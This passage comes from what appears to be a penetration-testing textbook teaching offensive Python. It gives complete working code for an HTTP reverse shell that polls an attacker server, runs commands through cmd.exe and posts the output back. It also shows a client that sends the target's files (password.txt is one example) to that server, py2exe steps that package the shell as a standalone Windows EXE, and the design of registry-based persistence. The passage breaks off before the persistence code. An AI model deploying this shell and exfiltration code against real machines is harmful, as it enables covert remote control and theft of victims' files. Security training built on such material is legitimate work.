<p class="calibre2">Now, create a folder named <kbd class="calibre12">Toexe</kbd> on your desktop. In this folder, you should have three things: the <kbd class="calibre12">py2exe</kbd> binary file, <kbd class="calibre12">py2exe</kbd> setup file, and your <kbd class="calibre12">Client.py</kbd> script file. For simplicity, rename the binary to <kbd class="calibre12">py2exe</kbd>.</p>
<p class="calibre2"><span class="calibre11">The setup file, </span><kbd class="calibre12">setup.py</kbd><span class="calibre11">, will set the criteria for the final standalone EXE file:</span></p>
<pre class="packt_figure"># py2exe download link: http://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>from distutils.core import setup<br class="title-page-name"/>import py2exe , sys, os<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>sys.argv.append("py2exe")<br class="title-page-name"/>setup(<br class="title-page-name"/>    options = {'py2exe': {'bundle_files': 1}},<br class="title-page-name"/> <br class="title-page-name"/>    windows = [{'script': "Client.py"}], <br class="title-page-name"/>    zipfile = None,<br class="title-page-name"/>    <br class="title-page-name"/>)</pre>
<p class="calibre2">In the <kbd class="calibre12">setup.py</kbd> script, we start by appending the <kbd class="calibre12">py2exe</kbd> binary into our directory. Then, we s<span class="calibre11">et the <kbd class="calibre12">bundle_files</kbd> to</span> <kbd class="calibre12">1</kbd>. <span class="calibre11">Define the name of our script,</span> <kbd class="calibre12">Client.py</kbd>. <span class="calibre11">Set</span> <kbd class="calibre12">zipfile</kbd> <span class="calibre11">to <kbd class="calibre12">None</kbd> and r</span><span class="calibre11">un this</span> <kbd class="calibre12">setup</kbd> <span class="calibre11">file.</span></p>
<p class="calibre2">Two folders will be created, called <kbd class="calibre12">build</kbd> and <kbd class="calibre12">dist</kbd> , after performing the aforementioned steps, as shown in the following screenshot:</p>
<div class="packt_figure1"><img src="../images/00023.jpeg" class="calibre35"/></div>
<p class="calibre2">So under the <kbd class="calibre12">dist</kbd> folder, we got our <kbd class="calibre12">Client.exe</kbd> as a standalone, without any dependencies. Now, on running <kbd class="calibre12">Client.exe</kbd>, we will get the connection (provided the server script from the previous section <em class="calibre16">Data exfiltration, </em>is running on the Kali side) and we can see that a the <kbd class="calibre12">Client.exe</kbd> process has been created on the <span class="calibre11">Windows Task Manager</span>, as shown in the following <span class="calibre11">screenshot</span>:</p>
<div class="packt_figure1"><img src="../images/00024.jpeg" class="calibre36"/></div>
<p class="calibre2">So once again, perform a quick verification as follows:</p>
<ol class="calibre13">
<li value="1" class="calibre10">Run <kbd class="calibre12">ipconfig</kbd></li>
<li value="2" class="calibre10">Navigate through the directories</li>
<li value="3" class="calibre10">Grab a file such as <kbd class="calibre12">Koala.png</kbd> and wait for its successful transfer:</li>
</ol>
<div class="packt_figure1"><img src="../images/00025.jpeg" class="calibre37"/></div>
<ol start="4" class="calibre13">
<li value="4" class="calibre10">Change the file extension to <kbd class="calibre12">.png</kbd></li>
<li value="5" class="calibre10">Now, open the image and, after successfully viewing it, terminate the <kbd class="calibre12">Client.exe</kbd> process</li>
<li value="6" class="calibre10">Execute <kbd class="calibre12">terminate</kbd> in the shell on your Kali machine</li>
<li value="7" class="calibre10">Once you hit <em class="calibre32">Enter</em>, it gets terminated on the target machine</li>
</ol>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">HTTP reverse shell</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will discuss a higher-level Python reverse shell, which will be carried over the HTTP protocol. The HTTP protocol is highly likely to be opened on the outbound or egress firewall rules, since it's used for web surfing. Also, a lot of HTTP traffic is required in every network, which makes monitoring much harder and the chances of us slipping up are high. Let's see how it works.</p>
<p class="calibre2">First, we'll configure a simple HTTP server and a simple HTTP client and we'll use the <kbd class="calibre12">GET</kbd> and <kbd class="calibre12">POST</kbd> methods to send data back and forth between these two entities. So, as mentioned earlier, the client will initiate a reverse HTTP session back to our server using a <kbd class="calibre12">GET</kbd> method and on the server side, once we receive a <kbd class="calibre12">GET</kbd> request, we'll start taking commands using raw input, and we will send that command back to the target.</p>
<p class="calibre2">Once we give the command to the target, it'll initiate a subprocess: a <kbd class="calibre12">cmd.exe</kbd> subprocess. Pass the command to that subprocess and it will post the result back to us using the <kbd class="calibre12">POST</kbd> method. Just to make sure there is continuity for our shell, we will perform <kbd class="calibre12">sleep</kbd> for 3 seconds. Then we will repeat the whole process all over again using the <kbd class="calibre12">while True:</kbd> infinite loop. The code is much simpler than the previous TCP socket, especially in the file transfer section, and this is because we are using a high-level protocol to transfer the files and data. The next section deals with the coding part.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Coding the HTTP reverse shell</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we'll cover the coding part for an HTTP reverse shell. On the client side, we'll be using a very high-level library to send our <kbd class="calibre12">GET</kbd> and <kbd class="calibre12">POST</kbd> requests. </p>
<p class="calibre2">The library called <kbd class="calibre12">Requests</kbd>, which is available at <a href="https://pypi.python.org/pypi/requests/2.7.0#downloads" class="calibre8">https://pypi.python.org/pypi/requests/2.7.0#downloads</a>, will make it much easier to do a <kbd class="calibre12">GET</kbd> or <kbd class="calibre12">POST</kbd> request in only a single line. <kbd class="calibre12">Requests</kbd> is a third-party library, so let's start by installing it. All you have to do is navigate through the Command Prompt to the folder that contains its setup file and issue <kbd class="calibre12">python setup.py install</kbd>.</p>
<p class="calibre2">To verify that the library has been installed successfully, open the Python interpreter, like we did earlier for  <kbd class="calibre12">py2exe</kbd> , and enter <kbd class="calibre12">import requests</kbd>. If no exceptions are thrown here, we're good to go:</p>
<div class="packt_figure1"><img src="../images/00026.jpeg" class="calibre33"/></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Server side</h1>
                
            
            <article>
                
<p class="calibre2"><span class="calibre11">The following block of code is on the server side:</span></p>
<pre class="packt_figure"># Python For Offensive PenTest: A Complete Practical Course - All rights reserved <br class="title-page-name"/># Follow me on LinkedIn https://jo.linkedin.com/in/python2<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/># Basic HTTP Server<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>import BaseHTTPServer # Built-in library we use to build simple HTTP server <br class="title-page-name"/><br class="title-page-name"/>HOST_NAME = '10.10.10.100' # Kali IP address <br class="title-page-name"/>PORT_NUMBER = 80 # Listening port number <br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler): # MyHandler defines what we should do when we receive a GET/POST request<br class="title-page-name"/>                                                          # from the client / target<br class="title-page-name"/><br class="title-page-name"/>    def do_GET(s):<br class="title-page-name"/>                                         #If we got a GET request, we will:- <br class="title-page-name"/>        command = raw_input("Shell&gt; ") #take user input<br class="title-page-name"/>        s.send_response(200) #return HTML status 200 (OK)<br class="title-page-name"/>        s.send_header("Content-type", "text/html") # Inform the target that content type header is "text/html"<br class="title-page-name"/>        s.end_headers()<br class="title-page-name"/>        s.wfile.write(command) #send the command which we got from the user input<br class="title-page-name"/><br class="title-page-name"/>            <br class="title-page-name"/>    def do_POST(s):<br class="title-page-name"/>                                                     #If we got a POST, we will:- <br class="title-page-name"/>        s.send_response(200) #return HTML status 200 (OK)<br class="title-page-name"/>        s.end_headers()<br class="title-page-name"/>        length = int(s.headers['Content-Length']) #Define the length which means how many bytes the HTTP POST data contains, the length<br class="title-page-name"/>                                                     #value has to be integer <br class="title-page-name"/>        postVar = s.rfile.read(length) # Read then print the posted data<br class="title-page-name"/>        print postVar<br class="title-page-name"/>        <br class="title-page-name"/>        <br class="title-page-name"/><br class="title-page-name"/>if __name__ == '__main__':<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>    # We start a server_class and create httpd object and pass our kali IP,port number and class handler(MyHandler)<br class="title-page-name"/>    <br class="title-page-name"/>    server_class = BaseHTTPServer.HTTPServer<br class="title-page-name"/>    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>    <br class="title-page-name"/>    try: <br class="title-page-name"/>        httpd.serve_forever() # start the HTTP server, however if we got ctrl+c we will Interrupt and stop the server<br class="title-page-name"/>    except KeyboardInterrupt: <br class="title-page-name"/>        print '[!] Server is terminated'<br class="title-page-name"/>        httpd.server_close()</pre>
<p class="calibre2">On the server side, we'll use a built-in library named <span class="calibre11"><kbd class="calibre12">BaseHTTPServer</kbd>,</span> to build a basic HTTP server, which handles the client requests. <span class="calibre11">Next, we define our Kali IP and the listening port address by setting</span> <kbd class="calibre12">PORT_NUMBER</kbd><span class="calibre11"> to </span><kbd class="calibre12">80</kbd><span class="calibre11">. </span><span class="calibre11">Then, we create a</span> <kbd class="calibre12">server_class</kbd> <span class="calibre11">and</span> <kbd class="calibre12">httpd</kbd> <span class="calibre11">object, and we will pass our listener IP, the</span> <kbd class="calibre12">PORT_NUMBER</kbd><span class="calibre11">, and a class handler</span> <kbd class="calibre12">MyHandler</kbd><span class="calibre11"> to the</span> <kbd class="calibre12">server_class</kbd><span class="calibre11">. </span><span class="calibre11">The class handler</span> <kbd class="calibre12">MyHandler</kbd> <span class="calibre11">defines what should be done when the server receives a</span> <kbd class="calibre12">GET</kbd> <span class="calibre11">or</span> <kbd class="calibre12">POST</kbd> <span class="calibre11">request. The server will run forever without coding a</span> <kbd class="calibre12">while True:</kbd><span class="calibre11">.</span></p>
<p class="calibre2">Now, if the server gets a <kbd class="calibre12">GET</kbd> request, it will grab the user input using the raw input and will send back an HTML status, <kbd class="calibre12">200</kbd>, which means OK. Now, the <kbd class="calibre12">send_header()</kbd> specifies the header field definition. It's mandatory to set this value since our HTTP client has to know the type of data. In this case, it's HTML text, <kbd class="calibre12">text/html</kbd>. <span class="calibre11">The</span> <kbd class="calibre12">wfile.write()</kbd> function <span class="calibre11">is equivalent to sending data in our previous TCP shell, and we will be using this function to send the command that the user has input to our target.</span></p>
<p class="calibre2">If the server gets a <kbd class="calibre12">POST</kbd> request first, similar to <kbd class="calibre12">GET</kbd>, we will return an HTML status <kbd class="calibre12">200</kbd> to say that we got the <kbd class="calibre12">POST</kbd> without any problem. The <kbd class="calibre12">s.headers['Content-Length']</kbd> specifies how many bytes the <kbd class="calibre12">HTTP POST</kbd> data contains. Note that the returned value is a string, but it has to be converted to an integer before passing it as a parameter to <kbd class="calibre12">rfile.read()</kbd>. We will use the <kbd class="calibre12">integer</kbd> function to perform this. Finally, we'll print the <kbd class="calibre12">postVar</kbd> variable, and in this case it'll be the command execution output. The server will run forever using the <kbd class="calibre12">serve_forever()</kbd> function without coding a <kbd class="calibre12">while True:</kbd>. However, if we invoke <em class="calibre16">Ctrl</em> + <em class="calibre16">C</em> from the keyboard, it will break the loop.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Client side</h1>
                
            
            <article>
                
<p class="calibre2"><span class="calibre11">The following block of code is on the client side:</span></p>
<pre class="packt_figure"># Python For Offensive PenTest: A Complete Practical Course - All rights reserved <br class="title-page-name"/># Follow me on LinkedIn https://jo.linkedin.com/in/python2<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/># Basic HTTP Client<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>import requests # Download Link https://pypi.python.org/pypi/requests#downloads , just extract the rar file and follow the video :)<br class="title-page-name"/>import subprocess <br class="title-page-name"/>import time<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>while True: <br class="title-page-name"/><br class="title-page-name"/>    req = requests.get('http://10.0.2.15') # Send GET request to our kali server<br class="title-page-name"/>    command = req.text # Store the received txt into command variable<br class="title-page-name"/>        <br class="title-page-name"/>    if 'terminate' in command:<br class="title-page-name"/>        break <br class="title-page-name"/><br class="title-page-name"/>    else:<br class="title-page-name"/>        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)<br class="title-page-name"/>        post_response = requests.post(url='http://10.0.2.15', data=CMD.stdout.read() ) # POST the result <br class="title-page-name"/>        post_response = requests.post(url='http://10.0.2.15', data=CMD.stderr.read() ) # or the error -if any-<br class="title-page-name"/><br class="title-page-name"/>    time.sleep(3)</pre>
<p class="calibre2">Here, we use the subprocess to create a shell, and then we create a <kbd class="calibre12">GET</kbd> request to our Kali server. Note that the <kbd class="calibre12">req.text</kbd> function returns the text that we have got from sending the <kbd class="calibre12">GET</kbd> request. In this case, <kbd class="calibre12">text</kbd> is the command that we should execute. Now, once we get the command, we will start a subprocess, and the execution result or error will be sent as a <kbd class="calibre12">POST</kbd> method in just a single line. Then, the process will sleep for 3 seconds, and repeat all over again. This <kbd class="calibre12">time.sleep()</kbd> part is just to be on the safe side—in case we get a packet drop or unexpected error.</p>
<div class="packt_infobox">Also, you can enhance this script by adding some exception handling using the <kbd class="calibre22">try</kbd> and <kbd class="calibre22">except</kbd> functions.</div>
<p class="calibre2">Once we proceed to run the script on both sides, we will get our shell on the server side and try navigating through the current working directories. Execute <kbd class="calibre12">ipconfig</kbd> and you'll get the complete IP configuration. Now, mistype a command and the error message will be thrown, as shown in the following output:</p>
<div class="packt_figure1"><img src="../images/00027.jpeg" class="calibre38"/></div>
<p class="calibre2">At the end we terminate the session by executing <kbd class="calibre12">terminate</kbd> on the server side. Once we do this, we exit our script on the client side, whereas to exit the script on the server side we need to hit on <em class="calibre16">Ctrl</em> + <em class="calibre16">C</em> on the keyboard to terminate the loop. The server will terminate by showing a <kbd class="calibre12">[!] Server is terminated</kbd> message.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Data exfiltration – HTTP</h1>
                
            
            <article>
                
<p class="calibre2">As we did with our TCP reverse shell, we will do a file transfer from the target machine back to the attacker machine.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Client side</h1>
                
            
            <article>
                
<p class="calibre2">Thankfully, the <kbd class="calibre12">Requests</kbd> library supports submitting a file in just two lines:</p>
<pre class="packt_figure2"># Python For Offensive PenTest: A Complete Practical Course - All rights reserved <br class="title-page-name"/># Follow me on LinkedIn https://jo.linkedin.com/in/python2<br class="title-page-name"/><br class="title-page-name"/># HTTP Data Exfiltration Client<br class="title-page-name"/><br class="title-page-name"/>import requests <br class="title-page-name"/>import subprocess <br class="title-page-name"/>import os<br class="title-page-name"/>import time<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>while True: <br class="title-page-name"/><br class="title-page-name"/>    req = requests.get('http://10.0.2.15')<br class="title-page-name"/>    command = req.text<br class="title-page-name"/>        <br class="title-page-name"/>    if 'terminate' in command:<br class="title-page-name"/>        break # end the loop<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/># Now similar to what we have done in our TCP reverse shell, we check if file exists in the first place, if not then we <br class="title-page-name"/># notify our attacker that we are unable to find the file, but if the file is there then we will :-<br class="title-page-name"/># 1.Append /store in the URL<br class="title-page-name"/># 2.Add a dictionary key called 'file'<br class="title-page-name"/># 3.requests library use POST method called "multipart/form-data" when submitting files<br class="title-page-name"/><br class="title-page-name"/>#All of the above points will be used on the server side to distinguish that this POST is for submitting a file NOT a usual command output<br class="title-page-name"/>#Please see the server script for more details on how we can use these points to get the file<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>    elif 'grab' in command:<br class="title-page-name"/>        <br class="title-page-name"/>        grab,path=command.split('*') # split the received grab command into two parts and store the second part in path variable<br class="title-page-name"/>        <br class="title-page-name"/>        if os.path.exists(path): # check if the file is there<br class="title-page-name"/>            <br class="title-page-name"/>            url = 'http://10.0.2.15/store' # Appended /store in the URL<br class="title-page-name"/>            files = {'file': open(path, 'rb')} # Add a dictionary key called 'file' where the key value is the file itself<br class="title-page-name"/>            r = requests.post(url, files=files) # Send the file and behind the scenes, requests library use POST method called "multipart/form-data"<br class="title-page-name"/>            <br class="title-page-name"/>        else:<br class="title-page-name"/>            post_response = requests.post(url='http://10.0.2.15', data='[-] Not able to find the file !' )<br class="title-page-name"/>            <br class="title-page-name"/>    else:<br class="title-page-name"/>        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)<br class="title-page-name"/>        post_response = requests.post(url='http://10.0.2.15', data=CMD.stdout.read() )<br class="title-page-name"/>        post_response = requests.post(url='http://10.0.2.15', data=CMD.stderr.read() )<br class="title-page-name"/><br class="title-page-name"/>    time.sleep(3)</pre>
<p class="calibre2">Here, we will perform the same process as we did in the TCP socket. If we get a <kbd class="calibre12">grab</kbd> command from the attacker machine, we will split this command into two parts, where the second part contains the path directory or the path for the file that we want to grab. Next, we will check whether the file is there. If not, we will notify the server about it immediately. Now, in case the file was there, notice that we have appended <kbd class="calibre12">/store</kbd> to our URL, <kbd class="calibre12">url = 'http://10.0.2.15/store'</kbd> as an indicator that we will be transferring a file, not a normal <kbd class="calibre12">cmd</kbd> output since both use the <kbd class="calibre12">POST</kbd> method to transmit data. So, for instance, when we send a file, let's say <kbd class="calibre12">x.doc</kbd>, we will send it with a <kbd class="calibre12">/store</kbd> in the URL. Also, the <kbd class="calibre12">Requests</kbd> library uses a special <kbd class="calibre12">POST</kbd> method called <kbd class="calibre12">multipart/form-data</kbd> to submit or send a file.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Server side</h1>
                
            
            <article>
                
<p class="calibre2">Now, on the server side, we've imported a new library called <kbd class="calibre12">cgi</kbd>. This one is used to handle the received file and store it locally. The following is the server side script:</p>
<pre class="packt_figure2"># Python For Offensive PenTest: A Complete Practical Course - All rights reserved <br class="title-page-name"/># Follow me on LinkedIn https://jo.linkedin.com/in/python2<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/># HTTP Data Exfiltration Server<br class="title-page-name"/><br class="title-page-name"/>import BaseHTTPServer<br class="title-page-name"/><br class="title-page-name"/>import os, cgi<br class="title-page-name"/><br class="title-page-name"/>HOST_NAME = '10.0.2.15' <br class="title-page-name"/>PORT_NUMBER = 80 <br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):<br class="title-page-name"/><br class="title-page-name"/>    def do_GET(s):<br class="title-page-name"/>    <br class="title-page-name"/>        command = raw_input("Shell&gt; ")<br class="title-page-name"/>        s.send_response(200)<br class="title-page-name"/>        s.send_header("Content-type", "text/html")<br class="title-page-name"/>        s.end_headers()<br class="title-page-name"/>        s.wfile.write(command)<br class="title-page-name"/>            <br class="title-page-name"/>    def do_POST(s):<br class="title-page-name"/><br class="title-page-name"/>        # Here we will use the points which we mentioned in the Client side, as a start if the "/store" was in the URL<br class="title-page-name"/>        # then this is a POST used for file transfer so we will parse the POST header, if its value was 'multipart/form-data' then we<br class="title-page-name"/>        # will pass the POST parameters to FieldStorage class, the "fs" object contains the returned values from FieldStorage in dictionary fashion<br class="title-page-name"/>        <br class="title-page-name"/>        <br class="title-page-name"/>        if s.path == '/store':<br class="title-page-name"/>            try:<br class="title-page-name"/>                ctype, pdict = cgi.parse_header(s.headers.getheader('content-type'))<br class="title-page-name"/>                if ctype == 'multipart/form-data' :<br class="title-page-name"/>                    fs = cgi.FieldStorage( fp = s.rfile, <br class="title-page-name"/>                                        headers = s.headers, <br class="title-page-name"/>                                        environ={ 'REQUEST_METHOD':'POST' } <br class="title-page-name"/>                                      )<br class="title-page-name"/>                else:<br class="title-page-name"/>                    print "[-] Unexpected POST request"<br class="title-page-name"/>                    <br class="title-page-name"/>                fs_up = fs['file'] # Remember, on the client side we submitted the file in dictionary fashion, and we used the key 'file'<br class="title-page-name"/>                                    # to hold the actual file. Now here to retrieve the actual file, we use the corresponding key 'file'<br class="title-page-name"/>                                    <br class="title-page-name"/>                with open('/root/Desktop/1.txt', 'wb') as o: # create a file holder called '1.txt' and write the received file into this '1.txt' <br class="title-page-name"/>                    o.write( fs_up.file.read() )<br class="title-page-name"/>                    s.send_response(200)<br class="title-page-name"/>                    s.end_headers()<br class="title-page-name"/>            except Exception as e:<br class="title-page-name"/>                print e<br class="title-page-name"/>                <br class="title-page-name"/>            return # once we store the received file in our file holder, we exit the function<br class="title-page-name"/><br class="title-page-name"/>        s.send_response(200)<br class="title-page-name"/>        s.end_headers()<br class="title-page-name"/>        length = int(s.headers['Content-Length'])<br class="title-page-name"/>        postVar = s.rfile.read(length )<br class="title-page-name"/>        print postVar<br class="title-page-name"/>        <br class="title-page-name"/>        <br class="title-page-name"/><br class="title-page-name"/>if __name__ == '__main__':<br class="title-page-name"/>    server_class = BaseHTTPServer.HTTPServer<br class="title-page-name"/>    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)<br class="title-page-name"/>    try:<br class="title-page-name"/>        httpd.serve_forever()<br class="title-page-name"/>    except KeyboardInterrupt:<br class="title-page-name"/>        print '[!] Server is terminated'<br class="title-page-name"/>        httpd.server_close()</pre>
<p class="calibre2">If we receive a <kbd class="calibre12">POST</kbd> with a <kbd class="calibre12">/store</kbd> in the URL and the content type as <kbd class="calibre12">multipart/form-data</kbd>, it means that we'll get a file from the target machine, not the usual command output. Then, we need to pass the received file, <kbd class="calibre12">headers</kbd>, and <kbd class="calibre12">REQUEST_METHOD</kbd> to the <kbd class="calibre12">FieldStorage</kbd> class. The returned value of <kbd class="calibre12">FieldStorage</kbd> can be indexed like a Python dictionary, where we have a key and a corresponding value. For instance, if we create a Python dictionary called <kbd class="calibre12">D</kbd> with a key <kbd class="calibre12">K</kbd> and value <kbd class="calibre12">v</kbd> as follows:</p>
<div class="packt_figure1"><img class="fm-editor-equation" src="../images/00028.jpeg"/></div>
<p class="calibre2">To get the value, <kbd class="calibre12">v</kbd> , we just need to have the corresponding key, <kbd class="calibre12">K</kbd>. On the client side, when we submitted the file, we attached a tag or key called <kbd class="calibre12">files ='file'</kbd>. So, we will use this tag or key on the server side to receive that file. The <kbd class="calibre12">FieldStorage</kbd> will grab the keys and its values and store them<span class="calibre11"> in an object called</span> <kbd class="calibre12">fs</kbd><span class="calibre11">. But we're only interested in the value of</span> <kbd class="calibre12">file</kbd><span class="calibre11">, which is the tag or key that contains the actual file we sent. Once we get that value, we will write it into a placeholder called</span> <kbd class="calibre12">1.txt</kbd><span class="calibre11">. In the end, we exit the function to prevent any mix-up with ongoing file transfer posts.</span></p>
<p class="calibre2">To initiate the file transfer, perform the following steps:</p>
<ol class="calibre13">
<li value="1" class="calibre10">Run the code the usual way on both machines (<span>Run</span> | <span>Run Module)</span></li>
<li value="2" class="calibre10">Once we get the <kbd class="calibre12">Shell&gt;</kbd>, proceed to perform a directory search with the <kbd class="calibre12">dir</kbd> command and try to grab a file, say <kbd class="calibre12">putty.exe</kbd>, by running the <kbd class="calibre12">grab</kbd> command, <kbd class="calibre12">grab*putty.exe</kbd></li>
<li value="3" class="calibre10"> Once we get the file on our server machine, rename the placeholder to <kbd class="calibre12"><span>putty.exe</span></kbd> and verify that we have <span> </span><kbd class="calibre12">putty.exe</kbd><span> </span>running fine without any file corruption. This can be done by executing the following from the Command Prompt:</li>
</ol>
<pre class="calibre39"><strong class="calibre1">wine putty.exe</strong></pre>
<ol start="4" class="calibre13">
<li value="4" class="calibre10">Go back to the shell and grab another file, say <kbd class="calibre12">password.txt</kbd>, just to test it.</li>
<li value="5" class="calibre10">Check whether you can read the contents after renaming the placeholder</li>
<li value="6" class="calibre10">Try to grab a non-existing file; you'll be presented with an error since it does not exist in the first place</li>
</ol>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Exporting to EXE</h1>
                
            
            <article>
                
<p class="calibre2">In this section, similar to what we have done in our TCP socket, we will export and test our HTTP reverse shell into an EXE, and test it after that.</p>
<p class="calibre2"><span class="calibre11">Here, also you need to create a folder named </span><kbd class="calibre12">Toexe</kbd><span class="calibre11"> on your desktop. As mentioned earlier, the <kbd class="calibre12">py2exe</kbd> binary file, the <kbd class="calibre12">py2exe</kbd> setup file, and the <kbd class="calibre12">HTTP_Client.py</kbd> script file should be in the folder. </span></p>
<p class="calibre2"><span class="calibre11">The setup file, </span><kbd class="calibre12">setup.py</kbd><span class="calibre11">, will be as shown here:</span></p>
<pre class="packt_figure2"># py2exe download link: http://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/<br class="title-page-name"/><br class="title-page-name"/># HTTP Exporting to EXE Client Setup<br class="title-page-name"/><br class="title-page-name"/>from distutils.core import setup<br class="title-page-name"/>import py2exe , sys, os<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>sys.argv.append("py2exe")<br class="title-page-name"/>setup(<br class="title-page-name"/>    options = {'py2exe': {'bundle_files': 1}},<br class="title-page-name"/> <br class="title-page-name"/>    windows = [{'script': "HTTP_Client.py"}], <br class="title-page-name"/>    zipfile = None,<br class="title-page-name"/>    <br class="title-page-name"/>)</pre>
<p class="calibre2">Perform the following steps to initiate the export:</p>
<ol class="calibre13">
<li value="1" class="calibre10">Start by editing the setup file  <kbd class="calibre12">py2exe</kbd> and change <kbd class="calibre12">Client.py</kbd> into <kbd class="calibre12">HTTP_Client.py</kbd>, which is the name of our script on the target side.</li>
<li value="2" class="calibre10">Execute the <kbd class="calibre12">setup.py</kbd> script.</li>
<li value="3" class="calibre10">Once we have finished, we will go to the <kbd class="calibre12">dist</kbd> folder and copy <kbd class="calibre12">HTTP_Client.py</kbd> to the desktop.</li>
<li value="4" class="calibre10">Ensure that the server is already running. Once we get the <kbd class="calibre12">Shell&gt;</kbd>, go to the directories using the <kbd class="calibre12">dir</kbd>.</li>
<li value="5" class="calibre10">Try to grab a file, say <kbd class="calibre12">grab*password.txt</kbd>, as we did in the previous sections.</li>
<li value="6" class="calibre10">After getting the file successfully on the server side, try other simple commands such as <kbd class="calibre12">cd</kbd> and <kbd class="calibre12">whoami</kbd>.</li>
<li value="7" class="calibre10">Try typing an incorrect command and check whether you are getting the proper error message</li>
<li value="8" class="calibre10">At the end, terminate the session from our shell by executing the <kbd class="calibre12">terminate</kbd> command</li>
<li value="9" class="calibre10">You can check to see that we have the <kbd class="calibre12">HTTP_Client.exe</kbd> process on our Windows machine; once we execute <kbd class="calibre12">terminate</kbd>, the process will disappear from the list confirming its termination</li>
</ol>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Persistence</h1>
                
            
            <article>
                
<p class="calibre2">Maintaining access is a very important phase of penetration testing. Let's assume that our target has run our shell and all things are going fine. Then suddenly, the target just turned off the computer. So, in this case, we'll lose everything. So, the key point here is that we need to survive after a reboot or a shutdown by the target machine. Now, before proceeding any further, some customers prohibit any modification to the target machine, so you've got to make sure you set the right expectations with your customer before proceeding any further.</p>
<p class="calibre2">If the modification is allowed, then we have three phases of execution as given here:</p>
<ol class="calibre13">
<li value="1" class="calibre10">First, we'll copy ourselves in a different location and we are doing that just in case our target deletes the shell file; so this copy is a backup. In this phase, two parameters should be identified. First, the <em class="calibre32">source path</em>, which is the directory where our shell exists or, in other words, the current working directory. The second parameter is the <em class="calibre32">destination path;</em> here it is the <kbd class="calibre12">Documents</kbd> folder. </li>
</ol>
<div class="packt_tip">Since each PC has a different username, we'll have to find this out as we don't know the username profile that was on our target previously.</div>
<ol start="2" class="calibre13">
<li value="2" class="calibre10">In the second phase, after copying our shell into the <kbd class="calibre12">Documents</kbd><span> </span>folder or <kbd class="calibre12">Documents</kbd><span> </span>directory, we need to add a registry key and point it out to the copied file in the <kbd class="calibre12">Documents</kbd> folder. Keep in mind that the first and second phases should only run once after our backdoor gets installed on the target machine for the first time.</li>
<li value="3" class="calibre10">The third phase is to start our reverse shell without repeating the preceding 2 phases.</li>
</ol>
<p class="calibre2">Since we don't know the current working directory or user profile, we've got to figure it out in the first place. This will happen in the system reconnaissance phase.</p>
<p class="calibre2">Now, to break down the workflow for our persistence shell, take a look at this simple flowchart:</p>
<div class="packt_figure1"><img src="../images/00029.jpeg" class="calibre40"/></div>
<p class="calibre2">Logically, we'll start with the system reconnaissance, <span class="calibre11">Sys Reconn</span>, phase and the output of this phase will include two things. First, we will discover the current working directory of our shell, and find out the user profile. The second output should be the destination path. Next, we need to determine whether we are running for the first time on the target machine. Now, you probably are wondering how can we do that. Well, thanks should go to the OS library for simplifying the task for us. To achieve this, we will simply check whether our script exists in the destination path or not. If it exists, then this is not the first time we are on the target side since we have already done the first two phases. So, we will skip phases 1 and 2, and fire up our shell.</p>
<p class="calibre2">However, if this is the first time we have run on the target side, we will copy ourselves to the destination path, which is what we do in phase 1. Then, we add a new registry key pointing to this location, which is phase 2 here. Finally, we need to make sure that we get our connection back to the Kali server. In two upcoming sections, you'll see everything in action to provide more clarity on this concept. For ease of understanding, we'll break the coding part into two parts. In the first part, we will make  <kbd class="calibre12">putty.exe</kbd> persistent, and in the second part we will wrap up and integrate the persistent script with our previous HTTP reverse shell.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Making putty.exe persistent</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we'll make the <kbd class="calibre12">putty.exe</kbd> program persistent. You can search on Google and download PuTTY software for free. As we explained earlier, our script will start by doing a system reconnaissance, and the output of this phase will either be the current working directory or the destination of the user profile.</p>
<p class="calibre2">Now, let's translate this phase into a block of code as shown here—these lines will perform the reconnaissance phase for us:</p>
